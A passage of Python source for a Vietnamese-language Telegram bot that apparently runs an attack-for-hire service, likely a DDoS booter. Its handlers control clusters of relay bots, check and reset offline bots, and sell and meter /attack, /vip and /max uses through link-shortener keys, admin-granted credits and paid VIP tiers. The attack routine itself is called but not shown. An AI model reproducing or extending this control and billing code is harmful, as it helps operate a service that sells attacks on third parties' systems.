        await self.send_message_to_admin("🟢 Bot đã được bật!\n📌 Bot đang hoạt động bình thường.")
        logger.info(f"Bot ON by admin {user_id}")

    async def cmd_auto(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        args = context.args
        if args and args[0].lower() == "on":
            state.auto_reset = True
            set_op_state(state.can_send_mother_1, state.can_send_mother_2, state.can_send_mother_3, True)
            await self.safe_send_message(update.effective_chat.id, "✅ Đã bật chế độ AUTO RESET.\nBot sẽ tự động reset bot offline mà không cần xác nhận.", reply_to_message_id=update.message.message_id)
            await self.send_message_to_admin("🤖 Chế độ AUTO RESET đã được bật.")
        elif args and args[0].lower() == "off":
            state.auto_reset = False
            set_op_state(state.can_send_mother_1, state.can_send_mother_2, state.can_send_mother_3, False)
            await self.safe_send_message(update.effective_chat.id, "✅ Đã tắt chế độ AUTO RESET.\nBot sẽ gửi xác nhận cho admin khi có bot offline.", reply_to_message_id=update.message.message_id)
            await self.send_message_to_admin("⏹️ Chế độ AUTO RESET đã được tắt.")
        else:
            state.auto_reset = not state.auto_reset
            set_op_state(state.can_send_mother_1, state.can_send_mother_2, state.can_send_mother_3, state.auto_reset)
            status = "bật" if state.auto_reset else "tắt"
            await self.safe_send_message(update.effective_chat.id, f"🔄 Đã {status} chế độ AUTO RESET.", reply_to_message_id=update.message.message_id)
            await self.send_message_to_admin(f"🔄 Đã {status} chế độ AUTO RESET.")

    async def cmd_stopauto(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        state.auto_reset = False
        set_op_state(state.can_send_mother_1, state.can_send_mother_2, state.can_send_mother_3, False)
        await self.safe_send_message(update.effective_chat.id, "⏹️ Đã tắt chế độ AUTO RESET.\nBot sẽ gửi xác nhận cho admin khi có bot offline.", reply_to_message_id=update.message.message_id)
        await self.send_message_to_admin("⏹️ Chế độ AUTO RESET đã được tắt bởi /stopauto.")
        logger.info(f"Auto reset disabled by admin {user_id}")

    async def cmd_autocheck_all(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        args = context.args
        if not args or len(args) < 1:
            await self.safe_send_message(
                update.effective_chat.id,
                "⚠️ Cú pháp: /autocheck_all on hoặc /autocheck_all off",
                reply_to_message_id=update.message.message_id
            )
            return
        arg = args[0].lower()
        if arg == "on":
            available = state.get_available_bots_by_cluster()
            if not available:
                await self.safe_send_message(
                    update.effective_chat.id,
                    "⚠️ Chưa có cụm nào được cấp quyền. Vui lòng /op trước.",
                    reply_to_message_id=update.message.message_id
                )
                return
            was_on = state.autocheck_all
            state.autocheck_all = True
            if state.autocheck_only:
                state.autocheck_only = False
                logger.info("Autocheck_all ON: tự động tắt autocheck_only")
            if not was_on:
                state.autocheck_reported_offline.clear()
            if state.is_off:
                msg = "✅ Đã bật AUTOCKECK_ALL. Bot đang OFF → sẽ chạy khi bot ON."
            else:
                msg = "✅ Đã bật AUTOCKECK_ALL. Chu kỳ: 7 phút."
            await self.safe_send_message(update.effective_chat.id, msg, reply_to_message_id=update.message.message_id)
            logger.info(f"Autocheck_all ON by admin {user_id}")
        elif arg == "off":
            state.autocheck_all = False
            await self.safe_send_message(
                update.effective_chat.id,
                "⏹️ Đã tắt AUTOCKECK_ALL.",
                reply_to_message_id=update.message.message_id
            )
            logger.info(f"Autocheck_all OFF by admin {user_id}")
        else:
            await self.safe_send_message(
                update.effective_chat.id,
                "⚠️ Cú pháp: /autocheck_all on hoặc /autocheck_all off",
                reply_to_message_id=update.message.message_id
            )

    async def cmd_autocheck_only(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        args = context.args
        if not args or len(args) < 1:
            await self.safe_send_message(
                update.effective_chat.id,
                "⚠️ Cú pháp: /autocheck_only on hoặc /autocheck_only off",
                reply_to_message_id=update.message.message_id
            )
            return
        arg = args[0].lower()
        if arg == "on":
            available = state.get_available_bots_by_cluster()
            if not available:
                await self.safe_send_message(
                    update.effective_chat.id,
                    "⚠️ Chưa có cụm nào được cấp quyền. Vui lòng /op trước.",
                    reply_to_message_id=update.message.message_id
                )
                return
            was_on = state.autocheck_only
            state.autocheck_only = True
            if state.autocheck_all:
                state.autocheck_all = False
                logger.info("Autocheck_only ON: tự động tắt autocheck_all")
            if not was_on:
                state.autocheck_reported_offline.clear()
            if state.is_off:
                msg = "✅ Đã bật AUTOCKECK_ONLY. Bot đang OFF → sẽ chạy khi bot ON."
            else:
                msg = "✅ Đã bật AUTOCKECK_ONLY. Chu kỳ: 7 phút."
            await self.safe_send_message(update.effective_chat.id, msg, reply_to_message_id=update.message.message_id)
            logger.info(f"Autocheck_only ON by admin {user_id}")
        elif arg == "off":
            state.autocheck_only = False
            await self.safe_send_message(
                update.effective_chat.id,
                "⏹️ Đã tắt AUTOCKECK_ONLY.",
                reply_to_message_id=update.message.message_id
            )
            logger.info(f"Autocheck_only OFF by admin {user_id}")
        else:
            await self.safe_send_message(
                update.effective_chat.id,
                "⚠️ Cú pháp: /autocheck_only on hoặc /autocheck_only off",
                reply_to_message_id=update.message.message_id
            )

    async def cmd_vip(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id

        if await self.check_off_and_group(update):
            return

        if not self.vip_manager.has_uses(user_id):
            price_text = self._get_vip_price_list_text()
            msg = (
                "❌ Bạn đã hết lượt sử dụng /vip. Vui lòng buy thêm lượt.!\n\n"
                f"{price_text}\n"
                "📌 Liên hệ admin để mua thêm lượt."
            )
            await self.safe_send_message(chat_id, msg, parse_mode="Markdown", reply_to_message_id=update.message.message_id)
            return

        await self.execute_attack(update, context, "vip")

    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        keyboard = [
            [InlineKeyboardButton("🟢 Cụm 1", callback_data="status_1")],
            [InlineKeyboardButton("🟢 Cụm 2", callback_data="status_2")],
            [InlineKeyboardButton("🟢 Cụm 3", callback_data="status_3")],
            [InlineKeyboardButton("🟢 Cả 3 cụm", callback_data="status_4")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await self.safe_send_message(
            update.effective_chat.id,
            "📊 <b>Vui lòng chọn cụm để kiểm tra bot:</b>\n\n"
            "• Cụm 1\n"
            "• Cụm 2\n"
            "• Cụm 3\n"
            "• Cả 3 cụm",
            parse_mode="HTML",
            reply_markup=reply_markup,
            reply_to_message_id=update.message.message_id
        )

    async def handle_callback_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if not self.is_admin(user_id):
            await query.edit_message_text("❌ Bạn không có quyền.")
            return
        choice = query.data.replace("status_", "")
        if choice == "1":
            bot_list = BOT_MOTHER_1_BOTS
            cluster_name = "Cụm 1"
            cluster_id = 1
        elif choice == "2":
            bot_list = BOT_MOTHER_2_BOTS
            cluster_name = "Cụm 2"
            cluster_id = 2
        elif choice == "3":
            bot_list = BOT_MOTHER_3_BOTS
            cluster_name = "Cụm 3"
            cluster_id = 3
        else:
            bot_list = ALL_BOTS
            cluster_name = "Cả 3 cụm"
            cluster_id = 4
        await query.edit_message_text(f"⏳ Đang kiểm tra {cluster_name}... Vui lòng chờ trong giây lát.")
        self._status_counter += 1
        status_key = self._status_counter
        try:
            results = await self.user_client.check_bots_status(bot_list, status_key)
            online_bots = []
            offline_bots = []
            for bot_username in bot_list:
                bot_display = self.user_client.get_bot_display_name(bot_username)
                if results.get(bot_username, False):
                    online_bots.append(bot_display)
                else:
                    offline_bots.append(bot_display)
            self._last_status_results[status_key] = {
                "cluster_id": cluster_id,
                "cluster_name": cluster_name,
                "online": online_bots,
                "offline": offline_bots,
                "bot_list": bot_list,
                "results": results
            }
            report = f"📊 <b>Kết quả kiểm tra {cluster_name}:</b>\n\n"
            report += f"🟢 Online: {len(online_bots)} bot\n"
            if online_bots:
                report += f"   • {', '.join(online_bots)}\n"
            report += f"\n🔴 Offline: {len(offline_bots)} bot\n"
            if offline_bots:
                report += f"   • {', '.join(offline_bots)}\n"
            keyboard = []
            if offline_bots:
                keyboard.append([InlineKeyboardButton("🔄 Reset các bot offline", callback_data=f"reset_cluster_{status_key}")])
            reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
            await self.safe_send_message(chat_id, report, parse_mode="HTML", reply_markup=reply_markup)
        except Exception as e:
            logger.error(f"Status check error: {e}")
            await self.safe_send_message(chat_id, f"❌ Lỗi khi kiểm tra trạng thái: {str(e)}")

    async def cmd_op(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if not self.is_admin(user_id):
            await self.safe_send_message(chat_id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        state_data = get_op_state()
        keyboard = []
        if state_data["mother_1"]:
            btn_text = "🔵 Cụm 1 ✅"
        else:
            btn_text = "🔵 Cụm 1"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"op_1")])
        if state_data["mother_2"]:
            btn_text = "🟢 Cụm 2 ✅"
        else:
            btn_text = "🟢 Cụm 2"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"op_2")])
        if state_data["mother_3"]:
            btn_text = "🟣 Cụm 3 ✅"
        else:
            btn_text = "🟣 Cụm 3"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"op_3")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await self.safe_send_message(
            chat_id,
            "🔓 <b>Vui lòng chọn cụm server để hoạt động:</b>\n\n"
            "• Cụm 1\n"
            "• Cụm 2\n"
            "• Cụm 3",
            parse_mode="HTML",
            reply_markup=reply_markup,
            reply_to_message_id=update.message.message_id
        )

    async def handle_callback_op(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await query.edit_message_text("❌ Bạn không có quyền.")
            return
        cluster = query.data.replace("op_", "")
        cluster_num = int(cluster)
        state_data = get_op_state()
        if cluster_num == 1:
            if state_data["mother_1"]:
                await query.edit_message_text("⚠️ Cụm 1 đã được cấp quyền trước đó.")
                return
            state_data["mother_1"] = True
            set_op_state(state_data["mother_1"], state_data["mother_2"], state_data["mother_3"], state_data.get("auto_reset", False))
            state.can_send_mother_1 = True
            await query.edit_message_text(
                f"🔓 Đã cấp quyền cho Cụm 1\n• Trạng thái: ✅ HOẠT ĐỘNG\n\n📊 Trạng thái hiện tại:\n"
                f"• Cụm 1: ✅ HOẠT ĐỘNG\n"
                f"• Cụm 2: {'✅ HOẠT ĐỘNG' if state_data['mother_2'] else '❌ NGỪNG HOẠT ĐỘNG'}\n"
                f"• Cụm 3: {'✅ HOẠT ĐỘNG' if state_data['mother_3'] else '❌ NGỪNG HOẠT ĐỘNG'}"
            )
            logger.info(f"OP 1 enabled by admin {user_id}")
        elif cluster_num == 2:
            if state_data["mother_2"]:
                await query.edit_message_text("⚠️ Cụm 2 đã được cấp quyền trước đó.")
                return
            state_data["mother_2"] = True
            set_op_state(state_data["mother_1"], state_data["mother_2"], state_data["mother_3"], state_data.get("auto_reset", False))
            state.can_send_mother_2 = True
            await query.edit_message_text(
                f"🔓 Đã cấp quyền cho Cụm 2\n• Trạng thái: ✅ HOẠT ĐỘNG\n\n📊 Trạng thái hiện tại:\n"
                f"• Cụm 1: {'✅ HOẠT ĐỘNG' if state_data['mother_1'] else '❌ NGỪNG HOẠT ĐỘNG'}\n"
                f"• Cụm 2: ✅ HOẠT ĐỘNG\n"
                f"• Cụm 3: {'✅ HOẠT ĐỘNG' if state_data['mother_3'] else '❌ NGỪNG HOẠT ĐỘNG'}"
            )
            logger.info(f"OP 2 enabled by admin {user_id}")
        elif cluster_num == 3:
            if state_data["mother_3"]:
                await query.edit_message_text("⚠️ Cụm 3 đã được cấp quyền trước đó.")
                return
            state_data["mother_3"] = True
            set_op_state(state_data["mother_1"], state_data["mother_2"], state_data["mother_3"], state_data.get("auto_reset", False))
            state.can_send_mother_3 = True
            await query.edit_message_text(
                f"🔓 Đã cấp quyền cho Cụm 3\n• Trạng thái: ✅ HOẠT ĐỘNG\n\n📊 Trạng thái hiện tại:\n"
                f"• Cụm 1: {'✅ HOẠT ĐỘNG' if state_data['mother_1'] else '❌ NGỪNG HOẠT ĐỘNG'}\n"
                f"• Cụm 2: {'✅ HOẠT ĐỘNG' if state_data['mother_2'] else '❌ NGỪNG HOẠT ĐỘNG'}\n"
                f"• Cụm 3: ✅ HOẠT ĐỘNG"
            )
            logger.info(f"OP 3 enabled by admin {user_id}")

    async def cmd_clean(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if not self.is_admin(user_id):
            await self.safe_send_message(chat_id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        state_data = get_op_state()
        keyboard = []
        if not state_data["mother_1"]:
            btn_text = "🔴 Cụm 1 ❌"
        else:
            btn_text = "🔴 Cụm 1"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"clean_1")])
        if not state_data["mother_2"]:
            btn_text = "🔴 Cụm 2 ❌"
        else:
            btn_text = "🔴 Cụm 2"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"clean_2")])
        if not state_data["mother_3"]:
            btn_text = "🔴 Cụm 3 ❌"
        else:
            btn_text = "🔴 Cụm 3"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"clean_3")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await self.safe_send_message(
            chat_id,
            "🔒 <b>Vui lòng chọn cụm server để ngừng hoạt động:</b>",
            parse_mode="HTML",
            reply_markup=reply_markup,
            reply_to_message_id=update.message.message_id
        )

    async def handle_callback_clean(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await query.edit_message_text("❌ Bạn không có quyền.")
            return
        cluster = query.data.replace("clean_", "")
        cluster_num = int(cluster)
        state_data = get_op_state()
        if cluster_num == 1:
            if not state_data["mother_1"]:
                await query.edit_message_text("⚠️ Cụm 1 đã bị thu hồi quyền trước đó.")
                return
            state_data["mother_1"] = False
            set_op_state(state_data["mother_1"], state_data["mother_2"], state_data["mother_3"], state_data.get("auto_reset", False))
            state.can_send_mother_1 = False
            await query.edit_message_text(
                f"🔒 Đã thu hồi quyền Cụm 1\n• Trạng thái: ❌ NGỪNG HOẠT ĐỘNG\n\n📊 Trạng thái hiện tại:\n"
                f"• Cụm 1: ❌ NGỪNG HOẠT ĐỘNG\n"
                f"• Cụm 2: {'✅ HOẠT ĐỘNG' if state_data['mother_2'] else '❌ NGỪNG HOẠT ĐỘNG'}\n"
                f"• Cụm 3: {'✅ HOẠT ĐỘNG' if state_data['mother_3'] else '❌ NGỪNG HOẠT ĐỘNG'}"
            )
            logger.info(f"OP 1 disabled by admin {user_id}")
        elif cluster_num == 2:
            if not state_data["mother_2"]:
                await query.edit_message_text("⚠️ Cụm 2 đã bị thu hồi quyền trước đó.")
                return
            state_data["mother_2"] = False
            set_op_state(state_data["mother_1"], state_data["mother_2"], state_data["mother_3"], state_data.get("auto_reset", False))
            state.can_send_mother_2 = False
            await query.edit_message_text(
                f"🔒 Đã thu hồi quyền Cụm 2\n• Trạng thái: ❌ NGỪNG HOẠT ĐỘNG\n\n📊 Trạng thái hiện tại:\n"
                f"• Cụm 1: {'✅ HOẠT ĐỘNG' if state_data['mother_1'] else '❌ NGỪNG HOẠT ĐỘNG'}\n"
                f"• Cụm 2: ❌ NGỪNG HOẠT ĐỘNG\n"
                f"• Cụm 3: {'✅ HOẠT ĐỘNG' if state_data['mother_3'] else '❌ NGỪNG HOẠT ĐỘNG'}"
            )
            logger.info(f"OP 2 disabled by admin {user_id}")
        elif cluster_num == 3:
            if not state_data["mother_3"]:
                await query.edit_message_text("⚠️ Cụm 3 đã bị thu hồi quyền trước đó.")
                return
            state_data["mother_3"] = False
            set_op_state(state_data["mother_1"], state_data["mother_2"], state_data["mother_3"], state_data.get("auto_reset", False))
            state.can_send_mother_3 = False
            await query.edit_message_text(
                f"🔒 Đã thu hồi quyền Cụm 3\n• Trạng thái: ❌ NGỪNG HOẠT ĐỘNG\n\n📊 Trạng thái hiện tại:\n"
                f"• Cụm 1: {'✅ HOẠT ĐỘNG' if state_data['mother_1'] else '❌ NGỪNG HOẠT ĐỘNG'}\n"
                f"• Cụm 2: {'✅ HOẠT ĐỘNG' if state_data['mother_2'] else '❌ NGỪNG HOẠT ĐỘNG'}\n"
                f"• Cụm 3: ❌ NGỪNG HOẠT ĐỘNG"
            )
            logger.info(f"OP 3 disabled by admin {user_id}")

    async def cmd_id(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        args = context.args
        target_user = None
        if args:
            username = args[0].strip().lstrip("@")
            try:
                target_user = await self.app.bot.get_chat(f"@{username}")
            except:
                await self.safe_send_message(update.effective_chat.id, f"❌ Không tìm thấy @{username}", reply_to_message_id=update.message.message_id)
                return
        elif update.message.reply_to_message:
            target_user = update.message.reply_to_message.from_user
        else:
            await self.safe_send_message(update.effective_chat.id, "⚠️ /id @username hoặc reply", reply_to_message_id=update.message.message_id)
            return
        if target_user:
            text = f"📌 <b>Thông tin:</b>\n👤 {target_user.first_name or 'Không có'} {target_user.last_name or ''}\n🆔 <code>{target_user.id}</code>\n🏷️ @{target_user.username or 'Không có'}"
            await self.safe_send_message(update.effective_chat.id, text, parse_mode="HTML", reply_to_message_id=update.message.message_id)

    async def cmd_getkey(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if await self.check_off_and_group(update):
            return
        available_services = []
        for service_id in SHORTENER_SERVICES.keys():
            can_use, _ = self.user_manager.can_getkey(user_id, service_id)
            if can_use:
                available_services.append(service_id)
        if not available_services:
            await self.safe_send_message(chat_id, "⚠️ Bạn đã dùng hết 2 lần vượt link của cả 2 dịch vụ hôm nay.\n• Vui lòng quay lại vào ngày mai!", parse_mode=None, reply_to_message_id=update.message.message_id)
            return
        keyboard = []
        for service_id in available_services:
            service = SHORTENER_SERVICES[service_id]
            remaining = self.user_manager.get_remaining_count(user_id, service_id)
            if remaining > 0:
                button_text = f"{service['icon']} {service['name']} (còn {remaining}/2)"
            else:
                button_text = f"{service['icon']} {service['name']} (đã hết lượt)"
            keyboard.append([InlineKeyboardButton(button_text, callback_data=f"getkey_{service_id}")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await self.safe_send_message(
            chat_id,
            "🔑 <b>Vui lòng chọn link vượt:</b>\n• Mỗi dịch vụ được sử dụng <b>2 lần/ngày</b>\n• Reset vào <b>00:00</b> hàng ngày",
            parse_mode="HTML",
            reply_markup=reply_markup,
            reply_to_message_id=update.message.message_id
        )

    async def handle_callback_getkey(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = update.effective_user.id
        service_id = query.data.replace("getkey_", "")
        if service_id not in SHORTENER_SERVICES:
            await query.edit_message_text("❌ Dịch vụ không hợp lệ.")
            return
        service = SHORTENER_SERVICES[service_id]
        can_use, remaining = self.user_manager.can_getkey(user_id, service_id)
        if not can_use:
            await query.edit_message_text(
                f"⚠️ Bạn đã dùng hết 2 lần vượt link của {service['name']} hôm nay.\n• Vui lòng quay lại vào ngày mai!\n• Hoặc chọn dịch vụ khác bằng /getkey",
                parse_mode=None
            )
            return
        key, token = generate_key_and_token()
        if not create_key_record(key, token):
            await query.edit_message_text("❌ Lỗi khi tạo key. Vui lòng thử lại.")
            return
        self.user_manager.add_getkey_record(user_id, service_id)
        web_url = f"{WEBKEY_URL}?token={token}"
        short_url = shorten_url(service_id, web_url)
        if not short_url:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('DELETE FROM keys WHERE key = ?', (key,))
            conn.commit()
            conn.close()
            await query.edit_message_text(
                f"⚠️ API {service['name']} hiện tại đang lỗi, vui lòng chọn dịch vụ khác!\n• /getkey để chọn lại",
                parse_mode=None
            )
            logger.warning(f"{service['name']} API failed for user {user_id}, key {key} deleted")
            return
        remaining_count = self.user_manager.get_remaining_count(user_id, service_id)
        message_text = (
            f"{service['icon']} <b>Link lấy key ({service['name']}):</b>\n"
            f"{short_url}\n\n"
            f"📌 Sau khi vượt link, copy key và nhập:\n"
            f"<code>/nhapkey KEY-XXXXXX</code>\n\n"
            f"⚠️ Mỗi key sẽ đổi được 3 lần sử dụng lệnh /attack\n"
            f"📊 Bạn còn <b>{remaining_count}</b> lần vượt link với {service['name']} hôm nay."
        )
        await query.edit_message_text(message_text, parse_mode="HTML", disable_web_page_preview=True)
        logger.info(f"Key created: {key} with token {token} for user {user_id} via {service_id}")

    async def cmd_nhapkey(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if await self.check_off_and_group(update):
            return
        args = context.args
        if len(args) < 1:
            await self.safe_send_message(chat_id, "⚠️ /nhapkey <key>", reply_to_message_id=update.message.message_id)
            return
        key = args[0].strip()
        if not is_key_valid(key):
            await self.safe_send_message(chat_id, "❌ Key không hợp lệ hoặc đã hết lượt sử dụng.", parse_mode=None, reply_to_message_id=update.message.message_id)
            return
        if use_key(key):
            self.user_manager.add_attack_uses(user_id, 3)
            uses = self.user_manager.get_attack_uses(user_id)
            await self.safe_send_message(
                chat_id,
                f"✅ <b>Key đúng!</b> +3 lượt /attack.\n📊 Bạn có <b>{uses}</b> lượt.",
                parse_mode="HTML",
                reply_to_message_id=update.message.message_id
            )
            logger.info(f"User {user_id} used key {key}")
        else:
            await self.safe_send_message(chat_id, "❌ Có lỗi xảy ra khi nhập key. Vui lòng thử lại.", parse_mode=None, reply_to_message_id=update.message.message_id)

    async def cmd_xu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if await self.check_off_and_group(update):
            return
        attack_uses = self.user_manager.get_attack_uses(user_id)
        vip_uses = self.vip_manager.get_remaining(user_id)
        await self.safe_send_message(
            chat_id,
            f"📊 <b>Lượt sử dụng của bạn:</b>\n\n⚔️ /attack: <b>{attack_uses}</b> lượt\n⚡ /vip: <b>{vip_uses}</b> lượt",
            parse_mode="HTML",
            reply_to_message_id=update.message.message_id
        )

    async def cmd_tluot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền sử dụng lệnh này.", parse_mode=None, reply_to_message_id=update.message.message_id)
            return
        args = context.args
        if len(args) < 1:
            await self.safe_send_message(update.effective_chat.id, "⚠️ Cú pháp: /tluot <id_telegram>", parse_mode=None, reply_to_message_id=update.message.message_id)
            return
        try:
            target_id = int(args[0])
        except ValueError:
            await self.safe_send_message(update.effective_chat.id, "❌ ID không hợp lệ. Vui lòng nhập số nguyên.", parse_mode=None, reply_to_message_id=update.message.message_id)
            return
        self.user_manager.add_attack_uses(target_id, 2)
        uses = self.user_manager.get_attack_uses(target_id)
        await self.safe_send_message(
            update.effective_chat.id,
            f"✅ Đã cộng 2 lượt dùng /attack cho user <code>{target_id}</code>.\n📊 User hiện có <b>{uses}</b> lượt.",
            parse_mode="HTML",
            reply_to_message_id=update.message.message_id
        )
        logger.info(f"Admin {user_id} added 2 attack uses to user {target_id}")

    async def cmd_addv(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        args = context.args
        if len(args) < 2:
            await self.safe_send_message(update.effective_chat.id, "⚠️ /addv <user_id> <so_lan_su_dung>", reply_to_message_id=update.message.message_id)
            return
        try:
            target_id = int(args[0])
            amount = int(args[1])
        except ValueError:
            await self.safe_send_message(update.effective_chat.id, "❌ ID và số lần phải là số.", reply_to_message_id=update.message.message_id)
            return
        if amount <= 0:
            await self.safe_send_message(update.effective_chat.id, "❌ Số lần phải lớn hơn 0.", reply_to_message_id=update.message.message_id)
            return
        try:
            chat = await self.app.bot.get_chat(target_id)
            name = chat.first_name or "Không có tên"
        except:
            name = "Không tìm thấy"
        remaining = self.vip_manager.add_uses(target_id, name, amount)
        await self.safe_send_message(
            update.effective_chat.id,
            f"✅ Đã cộng {amount} lần sử dụng VIP cho user {target_id} ({name}).\n📊 Hiện còn {remaining} lần.",
            reply_to_message_id=update.message.message_id
        )
        logger.info(f"Admin {user_id} added {amount} VIP uses to user {target_id}")

    async def cmd_admin_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Không có quyền.", reply_to_message_id=update.message.message_id)
            return
        if state.is_off:
            await self.safe_send_message(update.effective_chat.id, "⚠️ Server đang bảo trì.", reply_to_message_id=update.message.message_id)
            return
        await self.safe_send_message(update.effective_chat.id, ADMIN_MENU_TEXT, parse_mode="MarkdownV2", reply_to_message_id=update.message.message_id)

    async def cmd_groups(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Không có quyền.", reply_to_message_id=update.message.message_id)
            return
        if await self.check_off_and_group(update):
            return
        lines = []
        for gid, info in GROUP_MAPPING.items():
            lines.append(f"{info['name']}: {info['display']}\n   ID: {gid}")
        await self.safe_send_message(update.effective_chat.id, "📋 Danh sách nhóm:\n\n" + "\n".join(lines), reply_to_message_id=update.message.message_id)

    async def cmd_history(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Không có quyền.", reply_to_message_id=update.message.message_id)
            return
        if await self.check_off_and_group(update):
            return
        if not state.command_history:
            await self.safe_send_message(update.effective_chat.id, "📭 Chưa có lệnh.", reply_to_message_id=update.message.message_id)
            return
        lines = []
        for i, entry in enumerate(list(state.command_history)[-10:], 1):
            lines.append(f"{i}. {entry.get('time', '')[:19]} | {entry.get('dosage', '')} | {entry.get('command', '')}")
        await self.safe_send_message(update.effective_chat.id, "📜 Lịch sử:\n\n" + "\n".join(lines), reply_to_message_id=update.message.message_id)

    async def cmd_getid(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Không có quyền.", reply_to_message_id=update.message.message_id)
            return
        if await self.check_off_and_group(update):
            return
        chat_id = update.effective_chat.id
        title = update.effective_chat.title or "Private"
        await self.safe_send_message(update.effective_chat.id, f"📌 ID: <code>{chat_id}</code>\nTên: {title}", parse_mode="HTML", reply_to_message_id=update.message.message_id)

    async def cmd_addt(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Không có quyền.", reply_to_message_id=update.message.message_id)
            return
        args = context.args
        if len(args) < 1:
            await self.safe_send_message(update.effective_chat.id, "⚠️ /addt <id>", reply_to_message_id=update.message.message_id)
            return
        try:
            target = int(args[0])
        except:
            await self.safe_send_message(update.effective_chat.id, "❌ ID không hợp lệ.", reply_to_message_id=update.message.message_id)
            return
        if target == ADMIN_ID:
            await self.safe_send_message(update.effective_chat.id, "❌ Admin đã có quyền.", reply_to_message_id=update.message.message_id)
            return
        if self.perm_manager.add_permission(target, "attack"):
            await self.safe_send_message(update.effective_chat.id, f"✅ Cấp quyền /attack cho {target}", reply_to_message_id=update.message.message_id)
        else:
            await self.safe_send_message(update.effective_chat.id, f"⚠️ {target} đã có quyền.", reply_to_message_id=update.message.message_id)

    async def cmd_addm(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        args = context.args
        if len(args) < 1:
            await self.safe_send_message(update.effective_chat.id, "⚠️ /addm <id>", reply_to_message_id=update.message.message_id)
            return
        try:
            target = int(args[0])
        except:
            await self.safe_send_message(update.effective_chat.id, "❌ ID không hợp lệ.", reply_to_message_id=update.message.message_id)
            return
        if target == ADMIN_ID:
            await self.safe_send_message(update.effective_chat.id, "❌ Admin đã có quyền.", reply_to_message_id=update.message.message_id)
            return
        if self.perm_manager.add_permission(target, "max"):
            await self.safe_send_message(update.effective_chat.id, f"✅ Cấp quyền /max cho {target}", reply_to_message_id=update.message.message_id)
        else:
            await self.safe_send_message(update.effective_chat.id, f"⚠️ {target} đã có quyền.", reply_to_message_id=update.message.message_id)

    async def cmd_remove(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
